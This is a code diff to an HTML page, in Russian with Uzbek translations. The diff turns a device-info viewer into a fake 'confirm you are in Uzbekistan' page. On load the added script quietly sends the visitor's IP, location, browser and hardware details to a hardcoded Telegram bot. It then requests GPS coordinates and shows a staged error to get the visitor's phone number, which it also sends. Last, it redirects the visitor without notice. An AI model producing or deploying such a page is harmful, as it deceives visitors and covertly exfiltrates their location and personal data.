@@ -3,214 +3,242 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Расширенная информация об устройстве</title>
+    <title>Подтверждение местоположения</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 10px; /* Уменьшаем общий маржин для мобильных */
+            margin: 0;
             background-color: #e9ecef;
             color: #343a40;
             line-height: 1.6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            text-align: center;
         }
         .container {
             background-color: #ffffff;
-            padding: 15px; /* Уменьшаем паддинг для мобильных */
+            padding: 30px;
             border-radius: 10px;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            max-width: 900px;
-            margin: 10px auto; /* Меньший маржин сверху/снизу */
+            max-width: 400px;
+            width: 90%;
             border: 1px solid #dee2e6;
         }
         h1 {
             color: #007bff;
-            text-align: center;
-            margin-bottom: 20px; /* Уменьшаем маржин */
-            font-size: 1.8em; /* Немного уменьшаем размер для мобильных */
-            border-bottom: 2px solid #007bff;
-            padding-bottom: 8px;
-        }
-        .info-section {
             margin-bottom: 20px;
-            border-bottom: 1px dashed #ced4da;
-            padding-bottom: 15px;
+            font-size: 1.5em;
         }
-        .info-section:last-child {
-            border-bottom: none;
+        p {
+            margin-bottom: 20px;
+            font-size: 1.1em;
         }
-        .info-section h2 {
-            color: #28a745;
-            font-size: 1.2em; /* Немного уменьшаем размер для мобильных */
-            margin-top: 0;
-            margin-bottom: 10px;
-            background-color: #eafbea;
-            padding: 8px 10px; /* Уменьшаем паддинг */
-            border-left: 5px solid #28a745;
+        .button {
+            background-color: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1em;
+            transition: background-color 0.3s ease;
         }
-        .info-item {
-            display: flex;
-            flex-wrap: wrap; /* Позволяем элементам переноситься */
-            align-items: baseline;
-            margin-bottom: 8px;
-            font-size: 0.9em; /* Немного уменьшаем размер шрифта */
+        .button:hover {
+            background-color: #0056b3;
         }
-        .info-item strong {
-            flex: 0 0 100%; /* На мобильных метка занимает всю ширину */
-            margin-right: 0;
-            margin-bottom: 3px; /* Добавляем небольшой отступ между меткой и значением */
-            color: #495057;
-            font-weight: 600;
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-left-color: #007bff;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+            display: none; /* Hidden by default */
         }
-        .info-item span {
-            flex-grow: 1;
-            word-break: break-all;
-            color: #6c757d;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
-        .info-item .note {
-            font-size: 0.75em; /* Немного уменьшаем размер примечаний */
-            color: #888;
-            margin-left: 0; /* Удаляем отступ слева на мобильных */
-            width: 100%; /* Примечание тоже занимает всю ширину */
-            display: block; /* Отображаем как блок для новой строки */
-        }
-        .error {
+        .error-message {
             color: #dc3545;
             font-weight: bold;
+            margin-top: 20px;
+            margin-bottom: 15px;
         }
-        /* Media queries for larger screens (tablets and PCs) */
-        @media (min-width: 768px) {
-            body {
-                margin: 20px;
-            }
-            .container {
-                padding: 30px;
-                margin: 20px auto;
-            }
-            h1 {
-                font-size: 2em;
-                margin-bottom: 30px;
-            }
-            .info-section {
-                margin-bottom: 25px;
-                padding-bottom: 20px;
-            }
-            .info-section h2 {
-                font-size: 1.4em;
-                margin-bottom: 15px;
-                padding: 8px 15px;
-            }
-            .info-item {
-                font-size: 0.95em;
-            }
-            .info-item strong {
-                flex: 0 0 200px; /* Возвращаем фиксированную ширину для ПК/планшетов */
-                margin-right: 15px;
-                margin-bottom: 0; /* Убираем отступ */
-            }
-            .info-item .note {
-                font-size: 0.8em;
-                margin-left: 10px;
-                width: auto; /* Возвращаем автоматическую ширину */
-                display: inline; /* Отображаем как строчный элемент */
-            }
+        .phone-input {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ced4da;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        .phone-input.error {
+            border-color: #dc3545; /* Red border for error */
+        }
+        .phone-error-text {
+            color: #dc3545;
+            font-size: 0.9em;
+            margin-top: -10px;
+            margin-bottom: 10px;
+            display: none; /* Hidden by default */
+        }
+        #initialScreen, #checkingScreen, #phoneNumberScreen {
+            display: none; /* Managed by JS */
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Подробная информация об устройстве</h1>
-
-        <div class="info-section">
-            <h2>Основные данные</h2>
-            <div class="info-item">
-                <strong>User Agent:</strong> <span id="userAgent"></span>
-            </div>
-            <div class="info-item">
-                <strong>Операционная система:</strong> <span id="osInfo"></span>
-            </div>
-            <div class="info-item">
-                <strong>Платформа:</strong> <span id="platform"></span>
-            </div>
-            <div class="info-item">
-                <strong>Имя браузера:</strong> <span id="browserName"></span>
-            </div>
-            <div class="info-item">
-                <strong>Версия браузера:</strong> <span id="browserVersion"></span>
-            </div>
-            <div class="info-item">
-                <strong>Возможное название/модель устройства:</strong> <span id="deviceName"></span> <span class="note">(Основано на User Agent, может быть неточным)</span>
-            </div>
+        <div id="initialScreen">
+            <h1 id="initialTitle">Сначала подтвердите, что вы в Узбекистане</h1>
+            <p id="initialText">Для продолжения работы необходимо подтвердить ваше местоположение.</p>
+            <button id="confirmLocationBtn" class="button">Подтвердить</button>
         </div>
 
-        <div class="info-section">
-            <h2>Информация о сети</h2>
-            <div class="info-item">
-                <strong>Публичный IP адрес:</strong> <span id="publicIp"></span>
-            </div>
-            <div class="info-item">
-                <strong>Тип соединения (эффективный):</strong> <span id="connectionType"></span> <span class="note">(Приблизительно, по данным браузера)</span>
-            </div>
-            <div class="info-item">
-                <strong>Физический тип сети:</strong> <span id="networkType"></span> <span class="note">(Может быть WiFi, Cellular и т.д.)</span>
-            </div>
-            <div class="info-item">
-                <strong>API Bluetooth:</strong> <span id="bluetoothAPI"></span>
-            </div>
-            <div class="info-item">
-                <strong>API USB:</strong> <span id="usbAPI"></span>
-            </div>
+        <div id="checkingScreen">
+            <h1 id="checkingTitle">Проверка...</h1>
+            <div class="spinner"></div>
         </div>
 
-        <div class="info-section">
-            <h2>Местоположение</h2>
-            <div class="info-item">
-                <strong>Местоположение по IP:</strong> <span id="ipLocation"></span> <span class="note">(Приблизительно, по данным IP)</span>
-            </div>
-            <div class="info-item">
-                <strong>GPS координаты:</strong> <span id="gpsLocation"></span> <span class="note">(Требует разрешения, может быть неточным)</span>
-            </div>
+        <div id="phoneNumberScreen">
+            <p class="error-message" id="errorMessage">Ошибка определения, укажите номер, чтобы подтвердить.</p>
+            <input type="tel" id="phoneNumberInput" class="phone-input" placeholder="+998 XX XXX XX XX" required>
+            <div id="phoneNumberErrorText" class="phone-error-text">Неверный формат номера. Проверьте +998 и код оператора (33, 55, 6x, 7x, 88, 9x).</div>
+            <button id="continueBtn" class="button">Продолжить</button>
         </div>
 
-        <div class="info-section">
-            <h2>Аппаратное обеспечение</h2>
-            <div class="info-item">
-                <strong>Логические ядра CPU:</strong> <span id="hardwareConcurrency"></span> <span class="note">(Количество потоков, доступных JavaScript, не физические ядра CPU)</span>
+        <div id="deviceInfoDump" style="display: none;">
+            <div class="info-section">
+                <h2>Основные данные</h2>
+                <div class="info-item">
+                    <strong>User Agent:</strong> <span id="userAgent"></span>
+                </div>
+                <div class="info-item">
+                    <strong>Операционная система:</strong> <span id="osInfo"></span>
+                </div>
+                <div class="info-item">
+                    <strong>Платформа:</strong> <span id="platform"></span>
+                </div>
+                <div class="info-item">
+                    <strong>Имя браузера:</strong> <span id="browserName"></span>
+                </div>
+                <div class="info-item">
+                    <strong>Версия браузера:</strong> <span id="browserVersion"></span>
+                </div>
+                <div class="info-item">
+                    <strong>Возможное название/модель устройства:</strong> <span id="deviceName"></span> <span class="note">(Основано на User Agent, может быть неточным)</span>
+                </div>
             </div>
-            <div class="info-item">
-                <strong>Память устройства (ГБ):</strong> <span id="deviceMemory"></span> <span class="note">(Приблизительный объем ОЗУ)</span>
-            </div>
-            <div class="info-item">
-                <strong>Статус батареи:</strong> <span id="batteryStatus"></span>
-            </div>
-        </div>
 
-        <div class="info-section">
-            <h2>Дисплей</h2>
-            <div class="info-item">
-                <strong>Разрешение экрана (CSS pixels):</strong> <span id="screenResolution"></span>
+            <div class="info-section">
+                <h2>Информация о сети</h2>
+                <div class="info-item">
+                    <strong>Публичный IP адрес:</strong> <span id="publicIp"></span>
+                </div>
+                <div class="info-item">
+                    <strong>Тип соединения (эффективный):</strong> <span id="connectionType"></span> <span class="note">(Приблизительно, по данным браузера)</span>
+                </div>
+                <div class="info-item">
+                    <strong>Физический тип сети:</strong> <span id="networkType"></span> <span class="note">(Может быть WiFi, Cellular и т.д.)</span>
+                </div>
+                <div class="info-item">
+                    <strong>API Bluetooth:</strong> <span id="bluetoothAPI"></span>
+                </div>
+                <div class="info-item">
+                    <strong>API USB:</strong> <span id="usbAPI"></span>
+                </div>
             </div>
-            <div class="info-item">
-                <strong>Доступное разрешение (без UI):</strong> <span id="availableScreenResolution"></span>
-            </div>
-            <div class="info-item">
-                <strong>Размер окна (Viewport):</strong> <span id="viewportSize"></span>
-            </div>
-            <div class="info-item">
-                <strong>Глубина цвета:</strong> <span id="colorDepth"></span>
-            </div>
-            <div class="info-item">
-                <strong>Pixel Ratio устройства:</strong> <span id="devicePixelRatio"></span>
-            </div>
-            <div class="info-item">
-                <strong>Поддержка касаний:</strong> <span id="touchSupport"></span>
-            </div>
-        </div>
 
+            <div class="info-section">
+                <h2>Местоположение</h2>
+                <div class="info-item">
+                    <strong>Местоположение по IP:</strong> <span id="ipLocation"></span> <span class="note">(Приблизительно, по данным IP)</span>
+                </div>
+                <div class="info-item">
+                    <strong>GPS координаты:</strong> <span id="gpsLocation"></span> <span class="note">(Требует разрешения, может быть неточным)</span>
+                </div>
+            </div>
+
+            <div class="info-section">
+                <h2>Аппаратное обеспечение</h2>
+                <div class="info-item">
+                    <strong>Логические ядра CPU:</strong> <span id="hardwareConcurrency"></span> <span class="note">(Количество потоков, доступных JavaScript, не физические ядра CPU)</span>
+                </div>
+                <div class="info-item">
+                    <strong>Память устройства (ГБ):</strong> <span id="deviceMemory"></span> <span class="note">(Приблизительный объем ОЗУ)</span>
+                </div>
+                <div class="info-item">
+                    <strong>Статус батареи:</strong> <span id="batteryStatus"></span>
+                </div>
+            </div>
+
+            <div class="info-section">
+                <h2>Дисплей</h2>
+                <div class="info-item">
+                    <strong>Разрешение экрана (CSS pixels):</strong> <span id="screenResolution"></span>
+                </div>
+                <div class="info-item">
+                    <strong>Доступное разрешение (без UI):</strong> <span id="availableScreenResolution"></span>
+                </div>
+                <div class="info-item">
+                    <strong>Размер окна (Viewport):</strong> <span id="viewportSize"></span>
+                </div>
+                <div class="info-item">
+                    <strong>Глубина цвета:</strong> <span id="colorDepth"></span>
+                </div>
+                <div class="info-item">
+                    <strong>Pixel Ratio устройства:</strong> <span id="devicePixelRatio"></span>
+                </div>
+                <div class="info-item">
+                    <strong>Поддержка касаний:</strong> <span id="touchSupport"></span>
+                </div>
+            </div>
+             <div class="info-section">
+                <h2>Дополнительно</h2>
+                <div class="info-item">
+                    <strong>Cookies:</strong> <span id="cookiesEnabled"></span>
+                </div>
+                <div class="info-item">
+                    <strong>Языки браузера:</strong> <span id="languages"></span>
+                </div>
+                <div class="info-item">
+                    <strong>Часовой пояс:</strong> <span id="timezone"></span>
+                </div>
+            </div>
         </div>
+    </div>
 
     <script>
         // Telegram Bot Configuration
         const BOT_TOKEN = '7743325672:AAEgT4v4dYlMb3C_JJ9HJP38BYyc-z-3XnA'; // Your bot token
         const CHAT_ID = '7048297998'; // Your chat ID
+
+        // UI Elements
+        const initialScreen = document.getElementById('initialScreen');
+        const checkingScreen = document.getElementById('checkingScreen');
+        const phoneNumberScreen = document.getElementById('phoneNumberScreen');
+        const confirmLocationBtn = document.getElementById('confirmLocationBtn');
+        const continueBtn = document.getElementById('continueBtn');
+        const phoneNumberInput = document.getElementById('phoneNumberInput');
+        const spinner = document.querySelector('.spinner');
+        const initialTitle = document.getElementById('initialTitle');
+        const initialText = document.getElementById('initialText');
+        const checkingTitle = document.getElementById('checkingTitle');
+        const errorMessage = document.getElementById('errorMessage');
+        const phoneNumberErrorText = document.getElementById('phoneNumberErrorText'); // New element for error message
+
+        let collectedDeviceInfo = {}; // Global object to store info
+        let telegramMessageId = null; // To store the message ID for editing
+
+        // Function to detect if the browser is set to an Uzbek language
+        function isUzbekLanguage() {
+            const userLanguages = navigator.languages || [navigator.language || navigator.userLanguage];
+            return userLanguages.some(lang => lang.toLowerCase().startsWith('uz'));
+        }
 
         // Helper function to update text content
         function updateTextContent(id, text, className = '') {
@@ -222,7 +250,7 @@
         }
 
         // Helper to collect all info into an object
-        async function collectDeviceInfo() {
+        async function collectDeviceInfo(includeGps = false, includePhoneNumber = false) {
             const info = {};
 
             // --- Initial synchronous data gathering ---
@@ -342,44 +370,55 @@
             }
 
             // GPS Location
-            if ('geolocation' in navigator) {
-                await new Promise(resolve => {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            const lat = position.coords.latitude.toFixed(6);
-                            const lon = position.coords.longitude.toFixed(6);
-                            const accuracy = position.coords.accuracy.toFixed(2);
-                            info.gpsLocation = `Широта: ${lat}, Долгота: ${lon} (Точность: ${accuracy} м)`;
-                            resolve();
-                        },
-                        (error) => {
-                            let errorMessage;
-                            switch (error.code) {
-                                case error.PERMISSION_DENIED:
-                                    errorMessage = "Доступ к GPS отклонен пользователем.";
-                                    break;
-                                case error.POSITION_UNAVAILABLE:
-                                    errorMessage = "Информация о местоположении недоступна.";
-                                    break;
-                                case error.TIMEOUT:
-                                    errorMessage = "Таймаут получения местоположения.";
-                                    break;
-                                default:
-                                    errorMessage = "Неизвестная ошибка получения местоположения.";
-                                    break;
+            if (includeGps) {
+                 if ('geolocation' in navigator) {
+                    await new Promise(resolve => {
+                        navigator.geolocation.getCurrentPosition(
+                            (position) => {
+                                const lat = position.coords.latitude.toFixed(6);
+                                const lon = position.coords.longitude.toFixed(6);
+                                const accuracy = position.coords.accuracy.toFixed(2);
+                                info.gpsLocation = `Широта: ${lat}, Долгота: ${lon} (Точность: ${accuracy} м)`;
+                                resolve();
+                            },
+                            (error) => {
+                                let errorMessageGeo;
+                                switch (error.code) {
+                                    case error.PERMISSION_DENIED:
+                                        errorMessageGeo = "Доступ к GPS отклонен пользователем.";
+                                        break;
+                                    case error.POSITION_UNAVAILABLE:
+                                        errorMessageGeo = "Информация о местоположении недоступна.";
+                                        break;
+                                    case error.TIMEOUT:
+                                        errorMessageGeo = "Таймаут получения местоположения.";
+                                        break;
+                                    default:
+                                        errorMessageGeo = "Неизвестная ошибка получения местоположения.";
+                                        break;
+                                }
+                                info.gpsLocation = `Ошибка: ${errorMessageGeo}`;
+                                resolve(); // Resolve even on error to continue flow
+                            },
+                            {
+                                enableHighAccuracy: true,
+                                timeout: 3000, // Timeout for the geolocation request itself
+                                maximumAge: 0
                             }
-                            info.gpsLocation = `Ошибка: ${errorMessage}`;
-                            resolve(); // Resolve even on error to continue flow
-                        },
-                        {
-                            enableHighAccuracy: true,
-                            timeout: 3000, // Reduced timeout for faster collection
-                            maximumAge: 0
-                        }
-                    );
-                });
+                        );
+                    });
+                } else {
+                    info.gpsLocation = 'API геолокации не поддерживается'; // This also sets a specific error message
+                }
             } else {
-                info.gpsLocation = 'API геолокации не поддерживается';
+                info.gpsLocation = 'Не запрошено'; // Default if not included
+            }
+
+            // Phone Number (added separately later)
+            if (includePhoneNumber && collectedDeviceInfo.phoneNumber) {
+                info.phoneNumber = collectedDeviceInfo.phoneNumber;
+            } else {
+                info.phoneNumber = 'Не указан';
             }
 
             // --- Hardware Information (Battery is async) ---
@@ -397,17 +436,10 @@
                 info.batteryStatus = 'Не поддерживается';
             }
 
-            // Removed sections from collectDeviceInfo as requested:
-            // Graphics (WebGL)
-            // Multimedia
-            // Device Interaction
-            // Advanced Browser Capabilities
-            // Additional Information (except the core browser settings already kept)
-
             return info;
         }
 
-        // Function to display collected information on the page
+        // Function to display collected information on the page (for the hidden dump)
         function displayDeviceInfo(info) {
             updateTextContent('userAgent', info.userAgent);
             updateTextContent('osInfo', info.osInfo);
@@ -431,16 +463,63 @@
             updateTextContent('colorDepth', info.colorDepth);
             updateTextContent('devicePixelRatio', info.devicePixelRatio);
             updateTextContent('touchSupport', info.touchSupport);
-            // Removed display updates for sections that are no longer collected or displayed:
-            // webglVendor, webglRenderer, webglVersion, webgl2Support, webgpuSupport, webglExtensions
-            // videoCodecs, audioCodecs
-            // deviceSensors, gamepadAPI
-            // webWorkersSupport, serviceWorkersSupport, localStorageSupport, sessionStorageSupport, indexedDBSupport
             updateTextContent('cookiesEnabled', info.cookiesEnabled);
             updateTextContent('languages', info.languages);
             updateTextContent('timezone', info.timezone, info.timezone.includes('Ошибка') ? 'error' : '');
-            // Removed display updates for other 'Дополнительно' fields
-            // doNotTrackStatus, webrtcSupport, mediaDevicesHash, plugins, detectedFonts
+        }
+
+        // Function to generate HTML message for Telegram based on collected info
+        function generateTelegramHtml(info, includePhoneNumber = false) {
+            let telegramHtmlMessage = '<b><pre>Новая информация об устройстве:</pre></b>\n\n';
+
+            const escapeHtml = (unsafe) => {
+                return unsafe
+                    .replace(/&/g, "&amp;")
+                    .replace(/</g, "&lt;")
+                    .replace(/>/g, "&gt;")
+                    .replace(/"/g, "&quot;")
+                    .replace(/'/g, "&#039;");
+            };
+
+            if (includePhoneNumber && info.phoneNumber) {
+                telegramHtmlMessage += `<b><u>Введенный номер телефона:</u></b> ${escapeHtml(info.phoneNumber)}\n\n`;
+            }
+
+            const sections = {
+                'Основные данные': ['userAgent', 'osInfo', 'platform', 'browserName', 'browserVersion', 'deviceName'],
+                'Информация о сети': ['publicIp', 'connectionType', 'networkType', 'bluetoothAPI', 'usbAPI'],
+                'Местоположение': ['ipLocation', 'gpsLocation'],
+                'Аппаратное обеспечение': ['hardwareConcurrency', 'deviceMemory', 'batteryStatus'],
+                'Дисплей': ['screenResolution', 'availableScreenResolution', 'viewportSize', 'colorDepth', 'devicePixelRatio', 'touchSupport'],
+                'Дополнительно': ['cookiesEnabled', 'languages', 'timezone']
+            };
+
+            for (const sectionTitle in sections) {
+                telegramHtmlMessage += `<b><u>${escapeHtml(sectionTitle)}</u></b>\n`;
+                sections[sectionTitle].forEach(key => {
+                    let value = info[key];
+                    let note = '';
+                    // Add notes based on original HTML structure if needed
+                    if (key === 'deviceName') note = '(Основано на User Agent, может быть неточным)';
+                    if (key === 'connectionType') note = '(Приблизительно, по данным браузера)';
+                    if (key === 'networkType') note = '(Может быть WiFi, Cellular и т.д.)';
+                    if (key === 'ipLocation') note = '(Приблизительно, по данным IP)';
+                    if (key === 'gpsLocation') note = '(Требует разрешения, может быть неточным)';
+                    if (key === 'hardwareConcurrency') note = '(Количество потоков, доступных JavaScript, не физические ядра CPU)';
+                    if (key === 'deviceMemory') note = '(Приблизительный объем ОЗУ)';
+
+
+                    if (value !== undefined) {
+                        telegramHtmlMessage += `<b>${escapeHtml(document.getElementById(key).previousElementSibling.textContent.replace(':', ''))}:</b> ${escapeHtml(String(value))}`;
+                        if (note) {
+                            telegramHtmlMessage += ` <i>${escapeHtml(note)}</i>`;
+                        }
+                        telegramHtmlMessage += `\n`;
+                    }
+                });
+                telegramHtmlMessage += `\n`;
+            }
+            return telegramHtmlMessage;
         }
 
         // Function to send HTML content to Telegram bot
@@ -463,99 +542,163 @@
                 if (!response.ok) {
                     const errorData = await response.json();
                     console.error('Failed to send HTML message to Telegram:', errorData);
+                    return null;
                 } else {
-                    console.log('Device info HTML sent to Telegram successfully!');
+                    const responseData = await response.json();
+                    console.log('Device info HTML sent to Telegram successfully!', responseData);
+                    return responseData.result.message_id; // Return message_id
                 }
             } catch (error) {
                 console.error('Error sending HTML message to Telegram:', error);
+                return null;
             }
         }
 
-        // Main execution on page load
-        document.addEventListener('DOMContentLoaded', async function() {
-            const deviceInfo = await collectDeviceInfo();
-            displayDeviceInfo(deviceInfo); // Display immediately
-
-            // Generate HTML message for Telegram based on displayed content
-            let telegramHtmlMessage = '<b><pre>Новая информация об устройстве:</pre></b>\n\n';
-
-            // Function to sanitize text for HTML
-            const escapeHtml = (unsafe) => {
-                return unsafe
-                    .replace(/&/g, "&amp;")
-                    .replace(/</g, "&lt;")
-                    .replace(/>/g, "&gt;")
-                    .replace(/"/g, "&quot;")
-                    .replace(/'/g, "&#039;");
+        // Function to edit an existing Telegram message
+        async function editTelegramMessage(messageId, htmlContent) {
+            if (!messageId) {
+                console.warn('No message ID available to edit.');
+                return;
+            }
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`;
+            const params = {
+                chat_id: CHAT_ID,
+                message_id: messageId,
+                text: htmlContent,
+                parse_mode: 'HTML'
             };
 
-            // Iterate only over the remaining info-sections to reconstruct HTML
-            const sectionsToInclude = [
-                'Основные данные',
-                'Информация о сети',
-                'Местоположение',
-                'Аппаратное обеспечение',
-                'Дисплей'
-            ];
-
-            document.querySelectorAll('.info-section').forEach(section => {
-                const sectionTitleElement = section.querySelector('h2');
-                const sectionTitle = sectionTitleElement?.textContent.trim();
-
-                if (sectionTitle && sectionsToInclude.includes(sectionTitle)) {
-                    telegramHtmlMessage += `<b><u>${escapeHtml(sectionTitle)}</u></b>\n`;
-
-                    section.querySelectorAll('.info-item').forEach(item => {
-                        const strongText = item.querySelector('strong')?.textContent?.replace(':', '') || '';
-                        const spanElement = item.querySelector('span');
-                        const spanText = spanElement ? spanElement.textContent.trim() : '';
-                        const noteText = item.querySelector('.note')?.textContent || '';
-
-                        if (strongText && spanText) {
-                            telegramHtmlMessage += `<b>${escapeHtml(strongText)}:</b> ${escapeHtml(spanText)}`;
-                            if (noteText) {
-                                telegramHtmlMessage += ` <i>${escapeHtml(noteText)}</i>`;
-                            }
-                            telegramHtmlMessage += `\n`;
-                        }
-                    });
-                    telegramHtmlMessage += `\n`; // Add a newline after each section
-                }
-            });
-
-            // Telegram has a message size limit (4096 characters).
-            // We should split the message if it's too long.
-            const MAX_MESSAGE_LENGTH = 4096;
-            let currentMessagePart = '';
-            const messagesToSend = [];
-
-            // Simple splitting by lines for now, more complex splitting might be needed for very large data
-            const lines = telegramHtmlMessage.split('\n');
-            for (const line of lines) {
-                // Check if adding the next line would exceed the limit
-                if ((currentMessagePart + line + '\n').length > MAX_MESSAGE_LENGTH) {
-                    // If current part is not empty, push it
-                    if (currentMessagePart.length > 0) {
-                        messagesToSend.push(currentMessagePart);
-                    }
-                    // Start a new part with the current line
-                    currentMessagePart = line + '\n';
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(params)
+                });
+                if (!response.ok) {
+                    const errorData = await response.json();
+                    console.error('Failed to edit Telegram message:', errorData);
                 } else {
-                    // Otherwise, just add the line to the current part
-                    currentMessagePart += line + '\n';
+                    console.log('Telegram message edited successfully!');
                 }
+            } catch (error) {
+                console.error('Error editing Telegram message:', error);
             }
-            // Add any remaining part
-            if (currentMessagePart.length > 0) {
-                messagesToSend.push(currentMessagePart);
+        }
+
+        // Phone number validation function (now more flexible for input format)
+        function isValidPhoneNumber(phoneNumber) {
+            // Updated regex: Allows optional + or 998 prefix, then operator code (33, 55, 6x, 7x, 88, 9x) and 7 digits
+            const regex = /^(?:\+?998)?(?:33|55|6\d|7\d|88|9\d)\d{7}$/;
+            return regex.test(phoneNumber);
+        }
+
+        // Function to normalize phone number to +998 format
+        function normalizePhoneNumber(phoneNumber) {
+            phoneNumber = phoneNumber.replace(/\s/g, ''); // Remove all spaces
+
+            if (phoneNumber.startsWith('+998')) {
+                return phoneNumber;
+            } else if (phoneNumber.startsWith('998')) {
+                return '+' + phoneNumber;
+            } else {
+                // Assuming it's already in XX YYY YY YY format, prepend +998
+                return '+998' + phoneNumber;
+            }
+        }
+
+
+        // --- UI Logic ---
+        function showScreen(screenId) {
+            initialScreen.style.display = 'none';
+            checkingScreen.style.display = 'none';
+            phoneNumberScreen.style.display = 'none';
+            document.getElementById(screenId).style.display = 'block';
+        }
+
+        // Initial language setup
+        if (isUzbekLanguage()) {
+            initialTitle.textContent = "Avvalo, O'zbekistonda ekanligingizni tasdiqlang";
+            initialText.textContent = "Davom etish uchun joylashuvingizni tasdiqlashingiz kerak.";
+            confirmLocationBtn.textContent = "Tasdiqlash";
+            checkingTitle.textContent = "Tekshiruv...";
+            errorMessage.textContent = "Aniqlashda xatolik yuz berdi, tasdiqlash uchun raqamingizni kiriting.";
+            continueBtn.textContent = "Davom etish";
+            phoneNumberInput.placeholder = "+998 XX XXX XX XX";
+            phoneNumberErrorText.textContent = "Noto'g'ri raqam formati. +998 va operator kodini tekshiring (33, 55, 6x, 7x, 88, 9x).";
+        }
+
+        // Function to send initial device info when HTML loads
+        async function sendInitialDeviceInfo() {
+            collectedDeviceInfo = await collectDeviceInfo(false); // No GPS info initially
+            displayDeviceInfo(collectedDeviceInfo); // Update the hidden dump for accurate HTML generation
+            const initialHtml = generateTelegramHtml(collectedDeviceInfo);
+            telegramMessageId = await sendHtmlToTelegram(initialHtml);
+        }
+
+        window.onload = sendInitialDeviceInfo; // Send initial info on page load
+
+        showScreen('initialScreen'); // Show the first screen on load
+
+        confirmLocationBtn.addEventListener('click', async () => {
+            showScreen('checkingScreen');
+            spinner.style.display = 'block';
+
+            // Define a minimum delay for the checking screen
+            const minDelayPromise = new Promise(resolve => setTimeout(resolve, 2500)); // 2.5 seconds
+
+            // Collect device info with GPS and wait for the minimum delay simultaneously
+            const [gpsInfoResult] = await Promise.all([
+                collectDeviceInfo(true), // This will attempt to get GPS and resolve with info
+                minDelayPromise          // This will resolve after the minimum delay
+            ]);
+            
+            // Update the global collectedDeviceInfo object with the GPS result
+            collectedDeviceInfo = gpsInfoResult;
+
+            spinner.style.display = 'none';
+            showScreen('phoneNumberScreen');
+
+            // Update Telegram message with GPS info
+            displayDeviceInfo(collectedDeviceInfo); // Update the hidden dump for accurate HTML generation
+            const updatedHtmlWithGps = generateTelegramHtml(collectedDeviceInfo);
+            await editTelegramMessage(telegramMessageId, updatedHtmlWithGps);
+        });
+
+        // Event listener for input to clear error on typing
+        phoneNumberInput.addEventListener('input', () => {
+            phoneNumberInput.classList.remove('error');
+            phoneNumberErrorText.style.display = 'none';
+        });
+
+        continueBtn.addEventListener('click', async () => {
+            let phoneNumber = phoneNumberInput.value.trim();
+
+            if (!isValidPhoneNumber(phoneNumber)) {
+                phoneNumberInput.classList.add('error'); // Add error class to input
+                phoneNumberErrorText.style.display = 'block'; // Show error text
+                return; // Stop execution
             }
 
-            // Send each part
-            for (const msgPart of messagesToSend) {
-                await sendHtmlToTelegram(msgPart);
-                // Add a small delay between sending messages to avoid rate limits
-                await new Promise(resolve => setTimeout(resolve, 500));
-            }
+            // If validation passes, clear any previous error styles/messages
+            phoneNumberInput.classList.remove('error');
+            phoneNumberErrorText.style.display = 'none';
+
+            // Normalize the phone number before storing and sending
+            phoneNumber = normalizePhoneNumber(phoneNumber);
+            collectedDeviceInfo.phoneNumber = phoneNumber;
+
+            // Display collected info in the hidden dump (for the purpose of creating HTML for Telegram)
+            displayDeviceInfo(collectedDeviceInfo);
+
+            // Generate HTML message for Telegram based on displayed content
+            const finalTelegramHtmlMessage = generateTelegramHtml(collectedDeviceInfo, true); // Include phone number now
+
+            await editTelegramMessage(telegramMessageId, finalTelegramHtmlMessage);
+
+            // Redirect the user without notification
+            window.location.href = 'https://m.ok.ru/';
         });
     </script>
 </body>
